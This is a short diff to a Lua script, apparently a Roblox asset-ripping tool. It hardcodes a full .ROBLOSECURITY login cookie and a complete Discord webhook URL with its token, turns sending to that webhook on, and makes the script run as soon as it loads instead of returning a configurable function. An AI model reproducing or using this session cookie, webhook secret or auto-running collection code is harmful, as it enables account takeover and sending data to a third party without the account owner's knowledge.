@@ -19,8 +19,8 @@ local settings = {
     upload = false,
     robloxApiKey = nil,
     robloxId = nil,
-    sendToWebhook = false,
-    webhookURL = nil,
+    sendToWebhook = true,
+    webhookURL = "https://discord.com/api/webhooks/1487838457865830561/7Odf83QRDKbhzfO4svpHMR2LofpAN2cqKvB05qXTEIeFW-i4lHRRAsLpCjzrmxeQUIZL",
     cookie = ".ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhwKBGR1aWQSFDE0MTUwNjM3MTE2NTg2Mzg5NTQ5KAM.bzAxKiiW1Mwks05Hy0o5ygbBUj7p1evq3-lyHXYaNh7i7tMziOmIzJ4NyBl8zUpX3seoFZXO1eX3mCSWUCb_V82rTdSqDbBuIEYIxoC53BCm-HlAMADK13OenKYJNDtBFXEEW2WWU2ssM6Q_BTVXyDwYPmPnTrA0Sz7KOv8hFDQM9K4UP2jn31dUP49UKcmtSEz63kvAeaTVpZOXOe8yKZ3Ga_XbltqKzt-NMBDd1R-SWa04A7Wi5Ykaelnb8fpPLBfcLF1A3Wax9Fcercicz7Kn59YyPwNn9ijSNhwD6WmETGg6xVBj4L0dgmP-9gSh3eqv3XktQYXnZLFDpVcp1iuTbw66SZmpxiYZ1YvrUL40j0V0OHSuVqIqKIzVGbQuJrVtaRmjbOqrTW_Sjn9gsHR9MW1fdbvF3n8e96DapTUhXlvERn6yMKJZ3WHWvrbIEF6t_r3aSDfrQdan3kxzDWqEYyu3vrKNswDran9a59r6KoI9QHQk9MSi454r8V4M4_2TgVqJm1lDx0XUKTxZRzhbG4pAaQQTDS3Ir3gjp8ApZp4Vi18hU4UkrGBOAiIqhT8JL7QO8LkGDR9Tw4T9A3upglwdmP5ZkJ2Q1ayEvEr__-Rwbk7Oz8oS8PYa7V_i7wV49KaIbjlveduvtXkWJG3I5n5LHWwWX8gav0fUhiMjHqurtGgY9TGB8A_QImueZYJgsg6SCpyAnSMlY9zDKD9vcYLANdV90yoGyPc-RELFxQr8A-PJxkc7s5APSkmz83H7vYCBynnJNPMBaEFX5S-GciYb0BsKoXZPjfvagSx1BcUmgjdlZdZ94Al9D8lBHSRj6_bZmmtdnphCITCm_lRE1x-VAX2RstMTc7ZoSKNvkqP5n1vDvJ4uzxTUopBZpQUMuVagZkmkrHjJhNzPgHGlIaLz2IuH7a2kyrqv05fAPJwFQnLo-uz2dNtrxLPF6JLtYjikEIqhmR-CXDxWkL7XK-hf8rmUSUH81nRDrf0VRUAS",
     cookieValid = false,
     baseDownloadLocation = "asset taker/"
@@ -1076,11 +1076,4 @@ local function takeAssets()
     print("DONE")
 end
 
-return function(config)
-    if config then
-        for k, v in config do
-            settings[k] = v
-        end
-    end
-    takeAssets()
-end
+takeAssets()
